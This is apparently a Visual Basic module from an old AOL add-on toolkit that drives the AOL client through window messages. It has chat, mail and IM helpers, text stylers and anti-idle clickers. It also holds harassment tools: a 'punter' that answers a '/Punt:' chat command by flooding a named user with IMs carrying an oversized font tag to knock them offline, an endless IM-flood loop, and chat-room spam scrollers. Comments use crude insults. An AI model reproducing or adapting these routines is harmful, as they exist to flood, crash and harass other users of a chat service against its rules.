If nextchrr$ = "AE" Then Let nextchrr$ = "Æ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "oe" Then Let nextchrr$ = "œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If nextchrr$ = "OE" Then Let nextchrr$ = "Œ": Let newsent$ = newsent$ + nextchrr$: Let crapp% = 2: GoTo Greed
If crapp% > 0 Then GoTo Greed

If nextchr$ = "A" Then Let nextchr$ = "/\"
If nextchr$ = "a" Then Let nextchr$ = "å"
If nextchr$ = "B" Then Let nextchr$ = "ß"
If nextchr$ = "C" Then Let nextchr$ = "Ç"
If nextchr$ = "c" Then Let nextchr$ = "¢"
If nextchr$ = "D" Then Let nextchr$ = "Ð"
If nextchr$ = "d" Then Let nextchr$ = "ð"
If nextchr$ = "E" Then Let nextchr$ = "Ê"
If nextchr$ = "e" Then Let nextchr$ = "è"
If nextchr$ = "f" Then Let nextchr$ = "ƒ"
If nextchr$ = "H" Then Let nextchr$ = "|-|"
If nextchr$ = "I" Then Let nextchr$ = "‡"
If nextchr$ = "i" Then Let nextchr$ = "î"
If nextchr$ = "k" Then Let nextchr$ = "|‹"
If nextchr$ = "L" Then Let nextchr$ = "£"
If nextchr$ = "M" Then Let nextchr$ = "]V["
If nextchr$ = "m" Then Let nextchr$ = "^^"
If nextchr$ = "N" Then Let nextchr$ = "/\/"
If nextchr$ = "n" Then Let nextchr$ = "ñ"
If nextchr$ = "O" Then Let nextchr$ = "Ø"
If nextchr$ = "o" Then Let nextchr$ = "ö"
If nextchr$ = "P" Then Let nextchr$ = "¶"
If nextchr$ = "p" Then Let nextchr$ = "Þ"
If nextchr$ = "r" Then Let nextchr$ = "®"
If nextchr$ = "S" Then Let nextchr$ = "§"
If nextchr$ = "s" Then Let nextchr$ = "$"
If nextchr$ = "t" Then Let nextchr$ = "†"
If nextchr$ = "U" Then Let nextchr$ = "Ú"
If nextchr$ = "u" Then Let nextchr$ = "µ"
If nextchr$ = "V" Then Let nextchr$ = "\/"
If nextchr$ = "W" Then Let nextchr$ = "VV"
If nextchr$ = "w" Then Let nextchr$ = "vv"
If nextchr$ = "X" Then Let nextchr$ = "X"
If nextchr$ = "x" Then Let nextchr$ = "×"
If nextchr$ = "Y" Then Let nextchr$ = "¥"
If nextchr$ = "y" Then Let nextchr$ = "ý"
If nextchr$ = "!" Then Let nextchr$ = "¡"
If nextchr$ = "?" Then Let nextchr$ = "¿"
If nextchr$ = "." Then Let nextchr$ = "…"
If nextchr$ = "," Then Let nextchr$ = "‚"
If nextchr$ = "1" Then Let nextchr$ = "¹"
If nextchr$ = "%" Then Let nextchr$ = "‰"
If nextchr$ = "2" Then Let nextchr$ = "²"
If nextchr$ = "3" Then Let nextchr$ = "³"
If nextchr$ = "_" Then Let nextchr$ = "¯"
If nextchr$ = "-" Then Let nextchr$ = "—"
If nextchr$ = " " Then Let nextchr$ = " "
If nextchr$ = "<" Then Let nextchr$ = "«"
If nextchr$ = ">" Then Let nextchr$ = "»"
If nextchr$ = "*" Then Let nextchr$ = "¤"
If nextchr$ = "`" Then Let nextchr$ = "“"
If nextchr$ = "'" Then Let nextchr$ = "”"
If nextchr$ = "0" Then Let nextchr$ = "º"
Let newsent$ = newsent$ + nextchr$

Greed:
If crapp% > 0 Then Let crapp% = crapp% - 1
DoEvents
Loop

BoldBlackBlueBlack (newsent$)

End Function
Function R_Hacker(strin As String)
'Returns the strin hacker style
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
If nextchr$ = "A" Then Let nextchr$ = "a"
If nextchr$ = "E" Then Let nextchr$ = "e"
If nextchr$ = "I" Then Let nextchr$ = "i"
If nextchr$ = "O" Then Let nextchr$ = "o"
If nextchr$ = "U" Then Let nextchr$ = "u"
If nextchr$ = "b" Then Let nextchr$ = "B"
If nextchr$ = "c" Then Let nextchr$ = "C"
If nextchr$ = "d" Then Let nextchr$ = "D"
If nextchr$ = "z" Then Let nextchr$ = "Z"
If nextchr$ = "f" Then Let nextchr$ = "F"
If nextchr$ = "g" Then Let nextchr$ = "G"
If nextchr$ = "h" Then Let nextchr$ = "H"
If nextchr$ = "y" Then Let nextchr$ = "Y"
If nextchr$ = "j" Then Let nextchr$ = "J"
If nextchr$ = "k" Then Let nextchr$ = "K"
If nextchr$ = "l" Then Let nextchr$ = "L"
If nextchr$ = "m" Then Let nextchr$ = "M"
If nextchr$ = "n" Then Let nextchr$ = "N"
If nextchr$ = "x" Then Let nextchr$ = "X"
If nextchr$ = "p" Then Let nextchr$ = "P"
If nextchr$ = "q" Then Let nextchr$ = "Q"
If nextchr$ = "r" Then Let nextchr$ = "R"
If nextchr$ = "s" Then Let nextchr$ = "S"
If nextchr$ = "t" Then Let nextchr$ = "T"
If nextchr$ = "w" Then Let nextchr$ = "W"
If nextchr$ = "v" Then Let nextchr$ = "V"
If nextchr$ = " " Then Let nextchr$ = " "
Let newsent$ = newsent$ + nextchr$
Loop
BoldBlackBlueBlack (newsent$)


End Function
Function R_Hacker2(strin As String)
'Returns the strin hacker style
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
If nextchr$ = "A" Then Let nextchr$ = "a"
If nextchr$ = "E" Then Let nextchr$ = "e"
If nextchr$ = "I" Then Let nextchr$ = "i"
If nextchr$ = "O" Then Let nextchr$ = "o"
If nextchr$ = "U" Then Let nextchr$ = "u"
If nextchr$ = "b" Then Let nextchr$ = "B"
If nextchr$ = "c" Then Let nextchr$ = "C"
If nextchr$ = "d" Then Let nextchr$ = "D"
If nextchr$ = "z" Then Let nextchr$ = "Z"
If nextchr$ = "f" Then Let nextchr$ = "F"
If nextchr$ = "g" Then Let nextchr$ = "G"
If nextchr$ = "h" Then Let nextchr$ = "H"
If nextchr$ = "y" Then Let nextchr$ = "Y"
If nextchr$ = "j" Then Let nextchr$ = "J"
If nextchr$ = "k" Then Let nextchr$ = "K"
If nextchr$ = "l" Then Let nextchr$ = "L"
If nextchr$ = "m" Then Let nextchr$ = "M"
If nextchr$ = "n" Then Let nextchr$ = "N"
If nextchr$ = "x" Then Let nextchr$ = "X"
If nextchr$ = "p" Then Let nextchr$ = "P"
If nextchr$ = "q" Then Let nextchr$ = "Q"
If nextchr$ = "r" Then Let nextchr$ = "R"
If nextchr$ = "s" Then Let nextchr$ = "S"
If nextchr$ = "t" Then Let nextchr$ = "T"
If nextchr$ = "w" Then Let nextchr$ = "W"
If nextchr$ = "v" Then Let nextchr$ = "V"
If nextchr$ = " " Then Let nextchr$ = " "
Let newsent$ = newsent$ + nextchr$
Loop
BoldBlackBlueBlack2 (newsent$)


End Function
Function R_Spaced2(strin As String)
'Returns the strin spaced
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchr$ = nextchr$ + " "
Let newsent$ = newsent$ + nextchr$
Loop
 RedBlackRed2 (newsent$)

End Function

Function R_Spaced(strin As String)
'Returns the strin spaced
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let nextchr$ = Mid$(inptxt$, numspc%, 1)
Let nextchr$ = nextchr$ + " "
Let newsent$ = newsent$ + nextchr$
Loop
 BoldRedBlackRed (newsent$)

End Function
Function FindChildByTitle(parentw, childhand)
firs% = GetWindow(parentw, 5)
If UCase(GetCaption(firs%)) Like UCase(childhand) Then GoTo bone
firs% = GetWindow(parentw, GW_CHILD)

While firs%
firss% = GetWindow(parentw, 5)
If UCase(GetCaption(firss%)) Like UCase(childhand) & "*" Then GoTo bone
firs% = GetWindow(firs%, 2)
If UCase(GetCaption(firs%)) Like UCase(childhand) & "*" Then GoTo bone
Wend
FindChildByTitle = 0

bone:
Room% = firs%
FindChildByTitle = Room%
End Function

Function GetClass(child)
buffer$ = String$(250, 0)
getclas% = GetClassName(child, buffer$, 250)

GetClass = buffer$
End Function

Function FindChatRoom()
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
Room% = FindChildByClass(mdi%, "AOL Child")
stuff% = FindChildByClass(Room%, "_AOL_Listbox")
MoreStuff% = FindChildByClass(Room%, "RICHCNTL")
If stuff% <> 0 And MoreStuff% <> 0 Then
   FindChatRoom = Room%
Else:
   FindChatRoom = 0
End If
End Function
Function UserSN()
On Error Resume Next
aol% = FindWindow("AOL Frame25", "America  Online")
mdi% = FindChildByClass(aol%, "MDIClient")
welcome% = FindChildByTitle(mdi%, "Welcome, ")
WelcomeLength% = GetWindowTextLength(welcome%)
WelcomeTitle$ = String$(200, 0)
A% = GetWindowText(welcome%, WelcomeTitle$, (WelcomeLength% + 1))
UsER = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
UserSN = UsER
End Function

Sub KillWait()

aol% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(aol%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")

AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

For GetIcon = 1 To 19
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

Call timeout(0.05)
ClickIcon (AOIcon%)

Do: DoEvents
mdi% = FindChildByClass(aol%, "MDIClient")
KeyWordWin% = FindChildByTitle(mdi%, "Keyword")
AOEdit% = FindChildByClass(KeyWordWin%, "_AOL_Edit")
AOIcon2% = FindChildByClass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And AOEdit% <> 0 And AOIcon2% <> 0

Call SendMessage(KeyWordWin%, WM_CLOSE, 0, 0)
End Sub
Function IsUserOnline()
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
welcome% = FindChildByTitle(mdi%, "Welcome,")
If welcome% <> 0 Then
   IsUserOnline = 1
Else:
   IsUserOnline = 0
End If
End Function
Function GetCaption(hWnd)
hwndLength% = GetWindowTextLength(hWnd)
hwndTitle$ = String$(hwndLength%, 0)
A% = GetWindowText(hWnd, hwndTitle$, (hwndLength% + 1))

GetCaption = hwndTitle$
End Function

Sub SendChat(chat)
Room% = FindChatRoom
AORich% = FindChildByClass(Room%, "RICHCNTL")

AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusAPI(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub

Sub timeout(duration)
starttime = Timer
Do While Timer - starttime < duration
DoEvents
Loop

End Sub

Sub StayOnTop(TheForm As Form)
SetWinOnTop = SetWindowPos(TheForm.hWnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)
End Sub
Sub AOLChatPunter(SN1 As TextBox, Bombs As TextBox)
'This will see if somebody types /Punt: in a chat
'room...then punt the SN they put.
On Error GoTo errhandler
GINA69 = AOLGetUser
GINA69 = UCase(GINA69)

heh$ = AOLLastChatLine
heh$ = UCase(heh$)
naw$ = Mid(heh$, InStr(heh$, ":") + 2)
timeout (0.3)
SN = Mid(naw$, InStr(naw$, ":") + 1)
SN = UCase(SN)
timeout (0.3)
pntstr = Mid$(naw$, 1, (InStr(naw$, ":") - 1))
GINA = pntstr
If GINA = "/PUNT" Then
SN1 = SN
If SN1 = GINA69 Or SN1 = " " + GINA69 Or SN1 = "  " + GINA69 Or SN1 = "   " + GINA69 Or SN1 = "     " + GINA69 Or SN1 = "      " + GINA69 Then
SN1 = AOLGetSNfromCHAT
    BoldPurpleRed "· ···•(\›•    Room Punter"
    BoldPurpleRed "· ···•(\›•    I can't punt myself BITCH!"
    BoldPurpleRed "· ···•(\›•    Now U Get PUNTED!"
    GoTo JAKC
    timeout (1)
Exit Sub
End If
    GoTo SendITT
Else
    Exit Sub
End If
SendITT:
BoldPurpleRed "· ···•(\›•    Room punt"
BoldPurpleRed "· ···•(\›•    Request Noted"
BoldPurpleRed "· ···•(\›•    Now †h®åShîng - " + SN1
BoldPurpleRed "· ···•(\›•    Punting With - " + Bombs + " IMz"
JAKC:
Call IMsOff
Do
Call IMKeyword(SN1, "</P><P ALIGN=CENTER><font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>")
Bombs = Str(Val(Bombs - 1))
If FindWindow("#32770", "Aol canada") <> 0 Then Exit Sub: MsgBox "This User is not currently signed on, or his/her IMz are Off."
Loop Until Bombs <= 0
Call IMsOn
Bombs = "10"
errhandler:
    Exit Sub
End Sub
Public Sub Macrothing(Txt As TextBox)
'This scrolls a multilined textbox adding timeouts where needed
'This is basically for macro shops and things like that.
BoldPurpleRed "· ···•(\›• INCOMMING TEXT"
timeout 4
Dim onelinetxt$, X$, Start%, i%
Start% = 1
fa = 1
For i% = Start% To Len(Txt.text)
X$ = Mid(Txt.text, i%, 1)
onelinetxt$ = onelinetxt$ + X$
If Asc(X$) = 13 Then
BoldPurpleRed ": " + onelinetxt$
timeout (0.5)
J% = J% + 1
i% = InStr(Start%, Txt.text, X$)
If i% >= Len(Txt.text) Then Exit For
Start% = i% + 1
onelinetxt$ = ""
End If
Next i%
BoldSendChat ":" + onelinetxt$
End Sub
Sub Anti45MinTimer()
'use this sub in a timer set at 100
AOTimer% = FindWindow("_AOL_Palette", vbNullString)
AOIcon% = FindChildByClass(AOTimer%, "_AOL_Icon")
ClickIcon (AOIcon%)
End Sub
Sub AntiIdle()
'use this sub in a timer set at 100
AOModal% = FindWindow("_AOL_Modal", vbNullString)
AOIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AOIcon%)
End Sub
Sub ClickIcon(icon%)
Click% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
Click% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub
Sub SendMail(Recipiants, subject, message)

aol% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(aol%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

AOIcon% = GetWindow(AOIcon%, 2)

ClickIcon (AOIcon%)

Do: DoEvents
mdi% = FindChildByClass(aol%, "MDIClient")
AOMail% = FindChildByTitle(mdi%, "Write Mail")
AOEdit% = FindChildByClass(AOMail%, "_AOL_Edit")
AORich% = FindChildByClass(AOMail%, "RICHCNTL")
AOIcon% = FindChildByClass(AOMail%, "_AOL_Icon")
Loop Until AOMail% <> 0 And AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0

Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiants)

AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
AOEdit% = GetWindow(AOEdit%, 2)
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, subject)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, message)

For GetIcon = 1 To 18
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

ClickIcon (AOIcon%)

Do: DoEvents
AOError% = FindChildByTitle(mdi%, "Error")
AOModal% = FindWindow("_AOL_Modal", vbNullString)
If AOMail% = 0 Then Exit Do
If AOModal% <> 0 Then
AOIcon% = FindChildByClass(AOModal%, "_AOL_Icon")
ClickIcon (AOIcon%)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Sub
End If
If AOError% <> 0 Then
Call SendMessage(AOError%, WM_CLOSE, 0, 0)
Call SendMessage(AOMail%, WM_CLOSE, 0, 0)
Exit Do
End If
Loop
End Sub
Function FreeProcess()
Do: DoEvents
Process = Process + 1
If Process = 50 Then Exit Do
Loop
End Function

Sub keyword(TheKeyWord As String)
aol% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(aol%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")

AOIcon% = FindChildByClass(AOTool2%, "_AOL_Icon")

For GetIcon = 1 To 20
    AOIcon% = GetWindow(AOIcon%, 2)
Next GetIcon

' ******************************
' If you have used the KillGlyph sub in this bas, then
' the keyword icon is the 19th icon and you must use the
' code below

'For GetIcon = 1 To 19
'    AOIcon% = GetWindow(AOIcon%, 2)
'Next GetIcon

Call timeout(0.05)
ClickIcon (AOIcon%)

Do: DoEvents
mdi% = FindChildByClass(aol%, "MDIClient")
KeyWordWin% = FindChildByTitle(mdi%, "Keyword")
AOEdit% = FindChildByClass(KeyWordWin%, "_AOL_Edit")
AOIcon2% = FindChildByClass(KeyWordWin%, "_AOL_Icon")
Loop Until KeyWordWin% <> 0 And AOEdit% <> 0 And AOIcon2% <> 0

Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, TheKeyWord)

Call timeout(0.05)
ClickIcon (AOIcon2%)
ClickIcon (AOIcon2%)

End Sub
Function WinCaption(win)
WinTextLength% = GetWindowTextLength(win)
WinTitle$ = String$(hwndLength%, 0)
GetWinText% = GetWindowText(win, WinTitle$, (WinTextLength% + 1))
WinCaption = WinTitle$
End Function
Function BoldAOL4_WavColors(Text1 As String)
G$ = Text1
A = Len(G$)
For W = 1 To A Step 4
    R$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    P$ = P$ & "<b><FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & R$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006600" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#ff0000" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "##006600" & Chr$(34) & "></b>" & T$
Next W
SendChat (P$)
End Function
Function AOL4_WavColors3(Text1 As String)

End Function
Sub IMBuddy(Recipiant, message)

aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
Buddy% = FindChildByTitle(mdi%, "Buddy List Window")

If Buddy% = 0 Then
    keyword ("BuddyView")
    Do: DoEvents
    Loop Until Buddy% <> 0
End If

AOIcon% = FindChildByClass(Buddy%, "_AOL_Icon")

For L = 1 To 2
    AOIcon% = GetWindow(AOIcon%, 2)
Next L

Call timeout(0.01)
ClickIcon (AOIcon%)

Do: DoEvents
IMWin% = FindChildByTitle(mdi%, "Send Instant Message")
AOEdit% = FindChildByClass(IMWin%, "_AOL_Edit")
AORich% = FindChildByClass(IMWin%, "RICHCNTL")
AOIcon% = FindChildByClass(IMWin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, message)

For X = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next X

Call timeout(0.01)
ClickIcon (AOIcon%)

Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
IMWin% = FindChildByTitle(mdi%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop

End Sub
Sub IMKeyword(Recipiant, message)

aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")

Call keyword("aol://9293:")

Do: DoEvents
IMWin% = FindChildByTitle(mdi%, "Send Instant Message")
AOEdit% = FindChildByClass(IMWin%, "_AOL_Edit")
AORich% = FindChildByClass(IMWin%, "RICHCNTL")
AOIcon% = FindChildByClass(IMWin%, "_AOL_Icon")
Loop Until AOEdit% <> 0 And AORich% <> 0 And AOIcon% <> 0
Call SendMessageByString(AOEdit%, WM_SETTEXT, 0, Recipiant)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, message)

For X = 1 To 9
    AOIcon% = GetWindow(AOIcon%, 2)
Next X

Call timeout(0.01)
ClickIcon (AOIcon%)

Do: DoEvents
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
IMWin% = FindChildByTitle(mdi%, "Send Instant Message")
OkWin% = FindWindow("#32770", "America Online")
If OkWin% <> 0 Then Call SendMessage(OkWin%, WM_CLOSE, 0, 0): closer2 = SendMessage(IMWin%, WM_CLOSE, 0, 0): Exit Do
If IMWin% = 0 Then Exit Do
Loop

End Sub

Function GetText(child)
GetTrim = SendMessageByNum(child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
GetString = SendMessageByString(child, 13, GetTrim + 1, TrimSpace$)
GetText = TrimSpace$
End Function

Function GetChatText()
Room% = FindChatRoom
AORich% = FindChildByClass(Room%, "RICHCNTL")
chattext = GetText(AORich%)
GetChatText = chattext
End Function

Function LastChatLineWithSN()
'duh this will get the text from
'the last chatline with the sn
' used in many bots and shit like that
chattext$ = GetChatText

For FindChar = 1 To Len(chattext$)

thechar$ = Mid(chattext$, FindChar, 1)
thechars$ = thechars$ & thechar$

If thechar$ = Chr(13) Then
TheChatText$ = Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
End If

Next FindChar

lastlen = Val(FindChar) - Len(thechars$)
lastline = Mid(chattext$, lastlen, Len(thechars$))

LastChatLineWithSN = lastline
End Function

Function SNFromLastChatLine()
chattext$ = LastChatLineWithSN
ChatTrim$ = Left$(chattext$, 11)
For Z = 1 To 11
    If Mid$(ChatTrim$, Z, 1) = ":" Then
        SN = Left$(ChatTrim$, Z - 1)
    End If
Next Z
SNFromLastChatLine = SN
End Function

Function LastChatLine()
'duh this will get the text from
'the last chatline , used in many
'bots and shit like that
chattext = LastChatLineWithSN
ChatTrimNum = Len(SNFromLastChatLine)
ChatTrim$ = Mid$(chattext, ChatTrimNum + 4, Len(chattext) - Len(SNFromLastChatLine))
LastChatLine = ChatTrim$
End Function

Sub AddRoomToListBox(ListBox As ListBox)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
thelist.Clear

Room = FindChatRoom()
aolhandle = FindChildByClass(Room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If Person$ = UserSN Then GoTo Na
ListBox.AddItem Person$
Na:
Next Index
Call CloseHandle(AOLProcessThread)
End If

End Sub
Sub strangeim(stuff)
'I can't rember where I got this
'sub from but this is not one of mine
'thanxz to who ever I got it from
Do:
DoEvents
Call IMKeyword(stuff, "<body bgcolor=#000000>")
Call IMKeyword(stuff, "<body bgcolor=#0000FF>")
Call IMKeyword(stuff, "<body bgcolor=#FF0000>")
Call IMKeyword(stuff, "<body bgcolor=#00FF00>")
Call IMKeyword(stuff, "<body bgcolor=#C0C0C0>")
Loop 'This will loop untill a stop button is pressed.
End Sub

Public Sub AOLEightLine(Txt As TextBox)
'a simple 8 line scroller
A = String(116, Chr(32))
D = 116 - Len(Txt)
c$ = Left(A, D)
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""

SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""

SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""

SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 2

End Sub


Public Sub AOLFifteenLine(Txt As TextBox)
A = String(116, Chr(32))
D = 116 - Len(Txt)
c$ = Left(A, D)
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 1.5
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$
timeout 1.5
End Sub
Public Sub AOLFiveLine(Txt As TextBox)
A = String(116, Chr(32))
D = 116 - Len(Txt)
c$ = Left(A, D)
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$
timeout 0.3
End Sub




Public Sub AOLSixTeenLine(Txt As TextBox)
A = String(116, Chr(32))
D = 116 - Len(Txt)
c$ = Left(A, D)
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.7
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.7
End Sub

Public Function AOLSupRoom()
'used for a sup bot
If IsUserOnline = 0 Then GoTo last
FindChatRoom
If FindChatRoom = 0 Then GoTo last

On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

Room = FindChatRoom()
aolhandle = FindChildByClass(Room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
Call SendChat("HeY! " & Person$ & " WaZ uP?")
timeout (0.5)
Next Index
Call CloseHandle(AOLProcessThread)
End If
last:
End Function

Public Sub AOLTenLine(Txt As TextBox)
A = String(116, Chr(32))
D = 116 - Len(Txt)
c$ = Left(A, D)
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 1.5
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
End Sub

Public Sub AOLThirtyFiveLine(Txt As TextBox)
A = String(116, Chr(4))
D = 116 - Len(Txt)
c$ = Left(A, D)
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 1.5
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 1.5
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
timeout 1.5
